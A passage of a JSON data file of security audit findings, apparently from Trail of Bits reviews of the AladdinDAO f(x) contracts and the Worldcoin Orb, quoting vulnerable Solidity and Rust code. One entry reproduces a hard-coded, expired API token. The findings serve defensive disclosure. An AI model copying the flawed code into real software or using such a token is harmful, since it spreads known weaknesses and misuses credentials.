            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Lack of validation when updating system congurations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The market contracts Boolean congurations do not validate that the conguration has changed when they are updated. While setting the same value is benign, it may obscure a logical error in a peripheral program that would be readily identied if the update reverts and raises an alarm. function _updateBoolInMarketConfigData ( uint256 offset , bool newValue ) private returns ( bool oldValue ) { bytes32 _data = marketConfigData; oldValue = _data.decodeBool(offset); marketConfigData = _data.insertBool(newValue, offset); } Figure 13.1: Boolean cong update may have no eect ( aladdin-v3-contracts/contracts/f(x)/v2/MarketV2.sol#542546 ) While the stability ratio cannot be too large, the _updateStabilityRatio function does not validate that the stability ratio is greater than 100% (1e18), which would allow the protocol to be under-collateralized. function _updateStabilityRatio ( uint256 _newRatio ) private { if (_newRatio > type( uint64 ).max) revert ErrorStabilityRatioTooLarge(); bytes32 _data = marketConfigData; uint256 _oldRatio = _data.decodeUint(STABILITY_RATIO_OFFSET, 64 ); marketConfigData = _data.insertUint(_newRatio, STABILITY_RATIO_OFFSET, 64 ); emit UpdateStabilityRatio(_oldRatio, _newRatio); } Figure 13.2: Stability ratio does not require $1 backing for fToken ( aladdin-v3-contracts/contracts/f(x)/v2/MarketV2.sol#550558 ) Recommendations Short term, require that the new value is not equal to the old and that the stability ratio is not less than 100%. 39 AladdinDAO f(x) Protocol Security Assessment Long term, validate that system parameters are within sane bounds and that updates are not no-ops. 40 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Lack of slippage checks prevents user from specifying acceptable loss ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The router contract to interact with the FxUSD contract and Market contract does not allow specifying slippage limits for redeeming xToken and mint FxUSD, respectively. Note, there is a slippage check for the target asset in the Facet contract but not for the intermediary assets exchanged during the multi-leg swap. uint256 _baseOut = IFxMarketV2(_market).redeemXToken(_amountIn, address ( this ), 0 ); Figure 14.1: Lack of slippage check on redeeming xToken ( aladdin-v3-contracts/contracts/gateways/facets/FxUSDFacet.sol#205 ) uint256 _fxUSDMinted = IFxUSD(fxUSD).mint(_baseTokenIn, _amountIn, address ( this ), 0 ); Figure 14.2: Lack of slippage check on minting FxUSD ( aladdin-v3-contracts/contracts/gateways/facets/FxUSDFacet.sol#355 ) This also aects the Balancer wrapper contract, which was not in scope of our review. function unwrap ( uint256 _amount ) external override returns ( uint256 ) { address [] memory _assets = new address []( 2 ); uint256 [] memory _amounts = new uint256 []( 2 ); _assets[srcIndex] = src; _assets[ 1 - srcIndex] = WETH; uint256 _balance = IERC20(src).balanceOf( msg.sender ); IBalancerVault(BALANCER_VAULT).exitPool( poolId, address ( this ), msg.sender , IBalancerVault.ExitPoolRequest({ assets: _assets, minAmountsOut: _amounts, 41 AladdinDAO f(x) Protocol Security Assessment Figure 14.3: Lack of slippage check on Balancer swap ( aladdin-v3-contracts/contracts/f(x)/wrapper/FxTokenBalancerV2Wrapper.sol #89102 ) Recommendations Short term, allow users to specify a slippage tolerance for all paths. Long term, do not hard-code arguments that users should be able to input, especially ones that protect against losses. 42 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Deployments to L2 should check sequencer uptime for Chainlink price feeds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The protocols current usage of Chainlink price feeds does not consider whether the sequencer is down for deployments to layer 2 blockchains (L2s) such as Arbitrum and Optimism. This can result in the usage of stale price info and unfairly impact users. For example, it may be appropriate to allot a grace period for xToken holders before allowing them to redeem their proportion of the base collateral. However, insolvent deeply underwater treasuries should likely still be liquidated to avoid further losses. Exploit Scenario Holders of xToken are attempting to re-collateralize the system to prevent their NAV from becoming $0, but the L2s sequencer is down. An outdated price is used and fToken holders begin redeeming their portion of the treasurys collateral without sucient time for xToken holders to respond once the sequencer is up. Recommendations Short term, implement functionality to check the sequencer uptime with Chainlink oracles for deploying the f(x) protocol to L2s. Long term, validate that oracle prices are suciently fresh and not manipulated. References L2 Sequencer Uptime Feeds 43 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. Treating fToken as $1 creates arbitrage opportunity and unclear incentives ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The Treasury contract treats fToken as $1 regardless of the price on reference markets. This means that anyone can buy fToken and immediately redeem for prot, and the protocols collateralization will decrease more than it would have if valued at market value. During periods where the protocols collateral ratio is less than the stability ratio and fToken is valued at a premium, users may not readily redeem the fToken as expected because they will receive only $1 in collateral. This may delay or prevent re-collateralization, as minting fToken is one action that is anticipated to aid re-collateralization during stability mode. The arbitrage opportunity may exacerbate issues such as TOB-ADFX-20 by making it protable to purchase fToken on decentralized exchanges and redeem it in excess, but this requires further investigation. uint256 _fVal = _state.fSupply * PRECISION; Figure 16.1: Treasury values fToken as $1 (1e18) ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#621 ) Recommendations Short term, implement monitoring for the price of fToken and unusual activity, and create an action in an incident response plan for these scenarios. Long term, conduct further analysis and determine when it is favorable to the protocol to consider fToken worth $1 and when it may be risky. Design and implement mitigations, if necessary, and perform invariant testing on the changes. 44 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Rounding direction for deposits does not favor the protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "When users mint fToken and xToken, they must transfer the amount of base token obtained by maxMintableFToken and maxMinatableXToken , respectively, as collateral. Currently, these functions round the value of _maxBaseIn , the amount of collateral, down due to integer division. Thus, in some cases, the amount of collateral required may be less than the amount required if the same calculation were done using real numbers, and the protocol will receive less collateral than expected. This requires further investigation, but it would be best to specify rounding directions explicitly even if this issue is not currently exploitable. function maxMintableFToken (SwapState memory state, uint256 _newCollateralRatio ) internal pure returns ( uint256 _maxBaseIn , uint256 _maxFTokenMintable ) { [...] uint256 _baseVal = state.baseSupply * (state.baseNav) * (PRECISION); uint256 _fVal = _newCollateralRatio * (state.fSupply) * (PRECISION); if (_baseVal > _fVal) { _newCollateralRatio = _newCollateralRatio - (PRECISION); uint256 _delta = _baseVal - _fVal; _maxBaseIn = _delta / (state.baseNav * (_newCollateralRatio)); _maxFTokenMintable = _delta / (PRECISION * (_newCollateralRatio)); } } Figure 17.1: The calculated base amount required as collateral is rounded down ( aladdin-v3-contracts/contracts/f(x)/math/FxStableMath.sol#4570 ) Recommendations Short term, determine whether the protocol should round up deposits and implement the appropriate behavior, avoiding rounding errors that may trap the system. Long term, specify rounding directions explicitly and use fuzz testing to identify if it is possible to exacerbate the rounding issue and prot. 45 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Reverting when minting xToken can prevent re-collateralization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "When the treasury processes the mintXToken action, it validates that the oracle price is valid, and, if invalid, it reverts. During stability mode (collateral ratio between 100% and 130%), the protocol is designed to recover by incentivizing the minting of xToken in order to re-collateralize above 130%. Minting xToken may fail, even though it is necessary to recover from stability mode, and cause the protocol to collapse. Instead, the protocol could always permit the minting of xToken during stability mode and handle invalid prices by conservatively pricing the collateral and favoring the protocols credit risk health at the expense of the user minting. if (_action == Action.MintFToken || _action == Action.MintXToken) { if (!_isValid) revert ErrorInvalidOraclePrice(); } Figure 18.1: Minting xToken fails if the price is considered invalid ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#648649 ) Recommendations Short term, consider allowing minting of xToken at a conservative price when the protocol is in stability mode. Long term, identify actions that should never fail to succeed, such as those relevant to re-collateralizing the protocol, and implement invariant testing that ensures that they always succeed. 46 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Unclear economic sustainability of allowing user to avoid liquidations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The FxUSD contracts allow moving fToken from the rebalance pool into them and minting FxUSD. (This method is used to attempt to increase the collateral ratio by burning fToken.) Moving tokens in this way is allowed even when liquidations are possible (i.e., the collateral ratio is suciently low). The rebalance pool is intended to socialize the losses among fToken depositors, but nothing prevents withdrawing prior to liquidation transactions. This does not ensure that all depositors are on the hook for liquidation. Users who front-run liquidations and withdraw from the rebalance pool will not have the liquidated collateral credited to their share of rewards from the rebalance pool, but they will retain their balance of fToken. Since redeeming fToken may be the only action for re-collateralizating the protocol if xToken minting is failing ( TOB-ADFX-18 ), allowing withdrawals during stability mode may threaten the ability of the protocol to recover from delinquency. function wrapFrom ( address _pool , uint256 _amount , address _receiver ) external override onlySupportedPool(_pool) { if (isUnderCollateral()) revert ErrorUnderCollateral(); address _baseToken = IFxShareableRebalancePool(_pool).baseToken(); _checkBaseToken(_baseToken); _checkMarketMintable(_baseToken, false ); IFxShareableRebalancePool(_pool).withdrawFrom(_msgSender(), _amount, address ( this )); _mintShares(_baseToken, _receiver, _amount); emit Wrap(_baseToken, _msgSender(), _receiver, _amount); } Figure 20.1: Users can withdraw from rebalance pool and mint FxUSD in stability mode ( aladdin-v3-contracts/contracts/f(x)/v2/FxUSD.sol#160175 ) 47 AladdinDAO f(x) Protocol Security Assessment function liquidate ( uint256 _maxAmount , uint256 _minBaseOut ) external override onlyRole(LIQUIDATOR_ROLE) returns ( uint256 _liquidated , uint256 _baseOut ) { [...] // distribute liquidated base token _accumulateReward(_token, _baseOut); // notify loss _notifyLoss(_liquidated); } Figure 20.1: Users who evade liquidation miss rewards and avoid losses ( aladdin-v3-contracts/contracts/f(x)/rebalance-pool/ShareableRebalancePoo lV2.sol#3582 ) Recommendations Short term, consider preventing withdrawals from the rebalance pool when the fTokens treasurys collateral ratio is below the stability ratio and thus able to be liquidated. Long term, perform additional economic analysis regarding liquidations and whether the incentives of fToken holders and FxUSD holders align with the protocols interests. 48 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Collateral ratio does not account underlying value of collateral in strategy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "When collateral is moved into the strategy, the totalBaseToken amount remains unchanged. This does not account for shortfalls and surpluses in the value of the collateral moved into the strategy, and as a result, the collateral ratio may be over-reported or under-reported, respectively. The integration of strategies in the treasury has not been fully designed and has aws as evidenced by TOB-ADFX-5 . This feature should be reconsidered and thoroughly specied prior to active use. For example, it is unclear whether the strategys impact on the collateral ratio is robust below 130%. It may benet the stability of the system to prevent too much of the collateral from entering strategies during periods of high volatility or when the system is not overcollateralized by implementing a buer, or a maximum threshold of the amount of collateral devoted to strategies. function transferToStrategy ( uint256 _amount ) external override onlyStrategy { IERC20Upgradeable(baseToken).safeTransfer(strategy, _amount); strategyUnderlying += _amount; } Figure 8.1 Collateral is moved into strategy without updating totalBaseToken ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#375378 ) Since totalBaseToken is not updated for strategies, it may not be reected correctly in the amount of base token available to be harvested as reported by the harvestable function. function harvestable () public view returns ( uint256 ) { uint256 balance = IERC20Upgradeable(baseToken).balanceOf( address ( this )); uint256 managed = getWrapppedValue(totalBaseToken); if (balance < managed) return 0 ; else return balance - managed; } Figure 8.2: The rewards available to harvest does not consider value of strategy ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#274279 ) 31 AladdinDAO f(x) Protocol Security Assessment Recommendations Short term, disable the use of strategies for active deployments and consider removing the functionality altogether until it is fully specied and implemented. Long term, limit the number of features in core contracts and do not prematurely merge incomplete features. 32 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Rewards are withdrawn even if protocol is not su\u0000ciently collateralized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The treasury allows any excess base token amount beyond what is considered collateral to be distributed by calling the harvest function, harvest . Some of this token amount is sent to the rebalance pool as rewards. Since the rebalance pools purpose is to encourage the re-collateralization of treasury, it follows that temporarily withholding the rewards until the protocol is re-collateralized, or using them to cover shortfalls, may more eectively stabilize the system. /// @notice Harvest pending rewards to stability pool. function harvest () external { FxStableMath.SwapState memory _state = _loadSwapState(Action.None); _updateEMALeverageRatio(_state); uint256 _totalRewards = harvestable(); uint256 _harvestBounty = (getHarvesterRatio() * _totalRewards) / FEE_PRECISION; uint256 _rebalancePoolRewards = (getRebalancePoolRatio() * _totalRewards) / FEE_PRECISION; emit Harvest( msg.sender , _totalRewards, _rebalancePoolRewards, _harvestBounty); if (_harvestBounty > 0 ) { IERC20Upgradeable(baseToken).safeTransfer(_msgSender(), _harvestBounty); unchecked { _totalRewards = _totalRewards - _harvestBounty; } } if (_rebalancePoolRewards > 0 ) { _distributeRebalancePoolRewards(baseToken, _rebalancePoolRewards); unchecked { _totalRewards = _totalRewards - _rebalancePoolRewards; } } if (_totalRewards > 0 ) { IERC20Upgradeable(baseToken).safeTransfer(platform, _totalRewards); } } 33 AladdinDAO f(x) Protocol Security Assessment Figure 9.1: Reducing the base asset in Treasury ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#384413 ) Recommendations Short term, consider pausing reward harvesting when the collateral ratio is below the stability ratio and even using the rewards to compensate for shortfalls. Long term, perform additional review of the incentive compatibility and economic sustainability of the system. 34 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "20. Validation of system invariants is error prone ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The architecture of the f(x) protocol is interleaved and its interactions are complex. The interdependencies of the components are not managed well, and validations are distributed in disparate components rather than maintaining logical separation. We recommend simplifying the architecture and refactoring assertions about how the state is updated to be closely tied to where the state is updated. This is especially important in light of the concerns related to stability and incentives and lack of specication, as logical errors and economic issues may be coupled together. Making these investments will strengthen the security posture of the system and facilitate invariant testing. The Treasury does not validate the postcondition that the collateral ratio increases when minting xToken and redeeming fToken. In stability mode, liquidations perform fToken redemptions to attempt re-collateralizing the protocol to a collateral ratio above the stability ratio. function redeemFToken ( uint256 _fTokenIn , address _recipient , uint256 _minBaseOut ) external override nonReentrant returns ( uint256 _baseOut , uint256 _bonus ) { if (redeemPaused()) revert ErrorRedeemPaused(); if (_fTokenIn == type( uint256 ).max) { _fTokenIn = IERC20Upgradeable(fToken).balanceOf(_msgSender()); } if (_fTokenIn == 0 ) revert ErrorRedeemZeroAmount(); uint256 _stabilityRatio = stabilityRatio(); ( uint256 _maxBaseOut , uint256 _maxFTokenInBeforeSystemStabilityMode ) = IFxTreasuryV2(treasury).maxRedeemableFToken( _stabilityRatio ); uint256 _feeRatio = _computeFTokenRedeemFeeRatio(_fTokenIn, _maxFTokenInBeforeSystemStabilityMode); 49 AladdinDAO f(x) Protocol Security Assessment _baseOut = IFxTreasuryV2(treasury).redeem(_fTokenIn, 0 , _msgSender()); Figure 21.1: Treasury lacks postcondition that collateral ratio increases for fToken redemptions ( aladdin-v3-contracts/contracts/f(x)/v2/MarketV2.sol#301319 ) The Treasury does not validate the postcondition that the collateral ratio is not below stability ratio, allowing immediate liquidations when minting fToken. The credit health is softly enforced by the maxMintableFToken math library function used in the Market and by the FxUSD contract (when enabled), but it would be more robust to strictly require the collateral ratio has not fallen too far when performing mint actions to prevent insolvency. This applies to redeeming xToken as well since it is also expected to reduce the collateral ratio like minting fToken. function mintFToken ( uint256 _baseIn , address _recipient ) external override onlyRole(FX_MARKET_ROLE) returns ( uint256 _fTokenOut ) { } FxStableMath.SwapState memory _state = _loadSwapState(Action.MintFToken); if (_state.xNav == 0 ) revert ErrorUnderCollateral(); if (_state.baseSupply + _baseIn > baseTokenCap) revert ErrorExceedTotalCap(); _updateEMALeverageRatio(_state); _fTokenOut = _state.mintFToken(_baseIn); totalBaseToken = _state.baseSupply + _baseIn; IFxFractionalTokenV2(fToken).mint(_recipient, _fTokenOut); Figure 21.2: Treasury lacks postcondition that collateral ratio is greater than stability ratio ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#286303 ) While the Market charges extra fees when too much is minted, the fees arent deposited as collateral in the Treasury, and this added complexity increases the likelihood of bugs. In pursuit of simplicity, wed recommend disallowing minting excess beyond _maxBaseInBeforeSystemStabilityMode and only allowing minting up to the maximum amount. Currently, the minted amount is only bound if the fTokenMintPausedInStabilityMode is explicitly enabled but not by default. This has the added benet of making validation and testing/verication easier to perform. ( uint256 _maxBaseInBeforeSystemStabilityMode , ) = IFxTreasuryV2(treasury).maxMintableFToken(_stabilityRatio); if (_maxBaseInBeforeSystemStabilityMode > 0 ) { _maxBaseInBeforeSystemStabilityMode = IFxTreasuryV2(treasury).getWrapppedValue( 50 AladdinDAO f(x) Protocol Security Assessment _maxBaseInBeforeSystemStabilityMode ); } if (fTokenMintPausedInStabilityMode()) { uint256 _collateralRatio = IFxTreasuryV2(treasury).collateralRatio(); if (_collateralRatio <= _stabilityRatio) revert ErrorFTokenMintPausedInStabilityMode(); // bound maximum amount of base token to mint fToken. if (_baseIn > _maxBaseInBeforeSystemStabilityMode) { _baseIn = _maxBaseInBeforeSystemStabilityMode; } } uint256 _amountWithoutFee = _deductFTokenMintFee(_baseIn, _maxBaseInBeforeSystemStabilityMode); IERC20Upgradeable(baseToken).safeTransferFrom(_msgSender(), treasury, _amountWithoutFee); _fTokenMinted = IFxTreasuryV2(treasury).mintFToken( IFxTreasuryV2(treasury).getUnderlyingValue(_amountWithoutFee), _recipient ); Figure 21.3: Excess minting is permitted for additional fee ( aladdin-v3-contracts/contracts/f(x)/v2/MarketV2.sol#226249 ) Rather than having the Treasury validate that it is solvent, the validation is performed in FxUSD (which requires calling the Market and Treasury). This makes the composability of the system fragile as modifying a contract locally can have far reaching consequences that are not apparent in the scope of the di. Important validations related to core invariants should be clearly documented and be performed as close as possible to the component they are relevant to. function _checkMarketMintable ( address _baseToken , bool _checkCollateralRatio ) private view { address _treasury = markets[_baseToken].treasury; if (_checkCollateralRatio) { uint256 _collateralRatio = IFxTreasuryV2(_treasury).collateralRatio(); uint256 _stabilityRatio = IFxMarketV2(markets[_baseToken].market).stabilityRatio(); // not allow to mint when collateral ratio <= stability ratio if (_collateralRatio <= _stabilityRatio) revert ErrorMarketInStabilityMode(); } // not allow to mint when price is invalid if (!IFxTreasuryV2(_treasury).isBaseTokenPriceValid()) revert ErrorMarketWithInvalidPrice(); } 51 AladdinDAO f(x) Protocol Security Assessment Figure 21.4: FxUSD performs validation that should be in the core Treasury ( aladdin-v3-contracts/contracts/f(x)/v2/FxUSD.sol#391401 ) Rather than validating that the mint cap of fToken is reached in the FractionalToken implementation, it is done in FxUSD. This does not consider when FxUSD has not been added to the Market and the validation should be done in the token implementation instead. In general, performing validations against other contracts state variables instead of having the contract maintain the invariant is error prone. if (IERC20Upgradeable(_fToken).totalSupply() > _mintCap) revert ErrorExceedMintCap(); Figure 21.5: FxUSD enforces fToken mint cap instead of the token doing it ( aladdin-v3-contracts/contracts/f(x)/v2/FxUSD.sol#422 ) Recommendations Short term, validate that the collateral ratio has increased for minting xToken and redeeming fToken and that minting fToken and redeeming XToken do not put the collateral ratio below that stability ratio, allowing for immediate liquidations. While certain congurations of fees may be sucient to prevent unexpected behavior, it is more robust to simply prohibit actions which have undesired eects. Long term, perform validations specic to a component locally rather than sporadically performing validations in separate components. Simplify the architecture by refactoring disjointed components and make each component strictly validate itself. Create specications for each component and their interactions, and perform invariant testing to ensure the specication matches the implementation. 52 AladdinDAO f(x) Protocol Security Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. User data may persist to disk if the swap space is ever congured Fix Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The Orb software does not lock memory to RAM. This means that if the swap space is ever congured in the future, PII data such as user iris image data may be swapped to disk and persist there indenitely. The severity of this nding is rated as informational because the device does not currently have the swap space congured (gure 1.1). root@localhost:/home/worldcoin# free -h Mem: 5 .7Gi Swap: 0B 0B 0B total used free shared buff/cache available 6 .0Gi 6 .7Gi 456Mi 58Mi 604Mi root@localhost:/home/worldcoin# swapon --summary root@localhost:/home/worldcoin# Figure 1.1: The test device does not have swap space congured. Recommendations Short term, use the mlock syscall to lock the memory where PII data is stored to RAM. This will prevent that memory from being paged to the swap area if the swap area is ever congured on the device. Long term, when the device is updated to Linux kernel version 5.14 or newer, consider using the memfd_secret syscall to further secure important memory areas. This syscall allows allocated memory to be unmapped in the kernel space, which may provide more security guarantees.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of wrong SSD health check space reported due to integer overow Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The handle_ssd_health_check function (gure 2.1)used to ll in the SSD health check status request, which is sent to the TFH back endcould report incorrect values due integer overow. The function copies the values from the Stats structure (gure 2.2) to the Ssd structure elds; however, these elds are dened as i32 (gure 2.3), so the Stats values may overow. As a result, the reported SSD disk space values will always be in the i32 range, which is from around -2 GB to 2 GB, or exactly in the range of -2,147,483,648 to 2,147,483,648 bytes, even if the read disk space values exceed this range. #[allow(clippy::cast_possible_truncation)] fn handle_ssd_health_check (& mut self , report: & ssd ::Stats) { self .status_request.ssd.space_left = report.available_space as _; self .status_request.ssd.file_left = report.documents as _; self .status_request.ssd.signup_left_to_upload = report.signups as _; } Figure 2.1: orb-core/src/brokers/observer.rs /// SSD statistics. pub struct Stats { /// Available space on the SSD. pub available_space: u64 , /// Number of signups left to upload. pub signups: isize , /// Number of files left to upload. pub documents: isize , /// Number of files left to upload. pub documents_size: u64 , } Figure 2.2: orb-core/src/ssd.rs pub struct Ssd { pub file_left: i32 , pub space_left: i32 , pub signup_left_to_upload: i32 , } Figure 2.3: orb-core/src/backend/status.rs Exploit Scenario The Orb device has 21,474,836,482 bytes of disk space left, which is around 21 GB. However, the values copied from the Stats structure overow, causing handle_ssd_health_check to report just 1 byte of space left to the back end. Recommendations Short term, change the types used in the Ssd structure to u64 so that its values can hold the full range of possible disk space values. Long term, add unit tests for this case. Consider banning the #[allow(clippy::cast_possible_truncation)] annotation from the code to prevent similar issues from happening in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. An expired token for a nonexistent API checked into source code Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "One of the dened orb-core constants is an unused and expired DISTRIBUTOR_API_TOKEN token (gures 3.13.3). The token was used to communicate with an API that no longer exists. Nonetheless, such secret values should never be kept in plaintext in source code repositories, as they can become valuable tools to attackers if the repository is compromised or if an employee who should not have access to production tokens becomes malicious. /// Distributor API URL. pub const DISTRIBUTOR_API_URL: &str = \"https://api.getworldcoin.com/v1/graphql\" ; /// Distributor API Token. pub const DISTRIBUTOR_API_TOKEN: &str = \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlpVSUZ3Y0FXMGxBVEozSmxtQjRzWSJ9.eyJodH RwczovL2hhc3VyYS5pby9qd3QvY2xhaW1zIjp7IngtaGFzdXJhLWFsbG93ZWQtcm9sZXMiOlsib3JiIl0sIn gtaGFzdXJhLWF1dGgwLWlkIjoiYXV0aDB8NjA4MDYxZmUwZjAxN2EwMDY5YTZiZjIwIiwieC1oYXN1cmEtZG VmYXVsdC1yb2xlIjoib3JiIn0sIm5pY2tuYW1lIjoib3JiIiwibmFtZSI6Im9yYkB3b3JsZGNvaW4ub3JnIi wicGljdHVyZSI6Imh0dHBzOi8vcy5ncmF2YXRhci5jb20vYXZhdGFyLzliZTQwYzVlMzNkZWQyOGNjOGE1YT I5NTgwYWQ1M2FjP3M9NDgwJnI9cGcmZD1odHRwcyUzQSUyRiUyRmNkbi5hdXRoMC5jb20lMkZhdmF0YXJzJT JGb3IucG5nIiwidXBkYXRlZF9hdCI6IjIwMjEtMDQtMjFUMTc6NDA6NDAuNTAzWiIsImVtYWlsIjoib3JiQH dvcmxkY29pbi5vcmciLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImlzcyI6Imh0dHBzOi8vYXV0aC53b3JsZG NvaW4tZGlzdHJpYnV0b3JzLmNvbS8iLCJzdWIiOiJhdXRoMHw2MDgwNjFmZTBmMDE3YTAwNjlhNmJmMjAiLC JhdWQiOiJPVHpiZU5jVlFERjJZb3UyNkR6U2JQbEVQOXNUcjBMMyIsImlhdCI6MTYxOTAyNjg0MSwiZXhwIj oxNjUwMTMwODQxLCJhdF9oYXNoIjoic21TVzUtRVNUS0pPbXRwTEV3WWVuZyIsIm5vbmNlIjoiS0JERmx5X2 1QSlllQ3FybE1wREN0c0kyczBBajBReXcifQ.gfScnofoSxFo7cHcmYu6dINfDGZRUEAPbCkARtR8gEnb4bN 9kTFCKYhuGvUxXn4ffHjQUuu-qg4s5ABuqp9XddTYMZDYsEYw7lguiT68RSj9U18067ac6CP8Ltmg96g742K o27Dt-_7isKDT1CUI55pbO4tW1QY1B23hTGR6CFMN2cdgEOrSFh7kHHeRzLT20p7dqQ-k0WWyDraGMK9jzXo chzs5w10ziWYMvEWfg9gAXkUVR9ZxEvlHT2g1BKrcDH1Wyp-WdgdLg3d9AOYzNsaFi9kPg5u8QDUVsW5inaR KpF0FD0v4Q1B6oNlTEpU49a7v-VNVL0Uu6346r7_5Vg\" ; Figure 3.1: orb-core/src/consts.rs { \"alg\" : \"RS256\" , \"typ\" : \"JWT\" , \"kid\" : \"ZUIFwcAW0lATJ3JlmB4sY\" } { \"https://hasura.io/jwt/claims\" :{ \"x-hasura-allowed-roles\" :[ \"orb\" ], \"x-hasura-auth0-id \" : \"auth0|608061fe0f017a0069a6bf20\" , \"x-hasura-default-role\" : \"orb\" }, \"nickname\" : \"orb\" , \" name\" : \"orb@worldcoin.org\" , \"picture\" : \"https://s.gravatar.com/avatar/9be40c5e33ded28cc 8a5a29580ad53ac?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2For.png\" , \"update d_at\" : \"2021-04-21T17:40:40.503Z\" , \"email\" : \"orb@worldcoin.org\" , \"email_verified\" : false , \"iss\" : \"https://auth.worldcoin-distributors.com/\" , \"sub\" : \"auth0|608061fe0f017a0069a6bf 20\" , \"aud\" : \"OTzbeNcVQDF2You26DzSbPlEP9sTr0L3\" , \"iat\" : 1619026841 , \"exp\" : 1650130841 , \"at_h ash\" : \"smSW5-ESTKJOmtpLEwYeng\" , \"nonce\" : \"KBDFly_mPJYeCqrlMpDCtsI2s0Aj0Qyw\" } Figure 3.2: The header and payload elds decoded from the JWT shown in gure 3.1 In [ 1 ]: from datetime import datetime In [ 2 ]: print (datetime.utcfromtimestamp( 1650130841 ).strftime( '%Y-%m- %d %H:%M:%S' )) 2022 - 04 - 16 17 : 40 : 41 Figure 3.3: The expiration time (the \"exp\" claim highlighted in gure 3.2) converted to a datetime string, showing that the token has already expired Recommendations Short term, remove the hard-coded DISTRIBUTOR_API_TOKEN token and the DISTRIBUTOR_API_URL constants from the orb-core codebase, as those values are not used at all and the related API does not exist anymore. Long term, improve the CI/CD tooling used for the Orb to detect dead code such as this unused token. References  GitHub Docs: Removing sensitive data from a repository",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "4. Memory safety issues in the ZBar library Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The Orb uses the ZBar library , which has multiple memory safety issues. The library is used to scan user-provided QR codes with the identity commitment. We found two issues by fuzzing the zbar_scan_image function, which is directly used in the Orbs Rust code. (Refer to appendix B for more information on our fuzzing of the ZBar library.) We identied the following issues related to memory: 1. The match_segment_exp function may read a stack buer out of bounds. The function is used when the Orb reads GS1 DataBar codes. 2. The _zbar_sq_decode function has a memory leak issue. The function is used when the Orb reads Digital Seal SQCode codes, which are a variation of QR codes. The leak likely happens when the function encounters one of the error conditions and the allocated memory is not freed. 3. ZBars QR code reader also seems to have a memory leak issue, as reported in mchehab/zbar#258 . We did not investigate the full impact of these issues or try to exploit them; nonetheless, the out-of-bounds stack buer read could help attackers in exploiting the device and gaining the ability to execute code on it, and the two memory leaks can result in memory exhaustion, which would cause a denial of service. Also, while the rst two issues are not related to QR codes, they still aect the Orb since the Orb will try to read most code types if not congured otherwise, as highlighted in 